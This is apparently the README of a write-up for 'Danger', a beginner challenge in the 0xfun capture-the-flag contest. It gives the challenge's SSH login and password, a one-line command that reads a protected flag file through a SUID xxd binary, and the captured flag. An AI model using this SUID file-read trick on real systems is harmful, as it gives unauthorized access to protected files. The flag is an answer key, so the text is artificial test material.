# Danger - 0xfun CTF

**Category**: beginner | **Points**: 50

## Quick Solve

```bash
# SSH into the server
ssh Danger@chall.0xfun.org -p59069
# Password: password

# Read flag using SUID xxd
xxd flag.txt | xxd -r
```

## Files
- `solution.md` - Complete writeup
- `exploit.py` - Automated exploit script
- `flag.txt` - Captured flag

## Usage
```bash
python3 exploit.py
```

## Flag
```
0xfun{Easy_Access_Granted!}
```
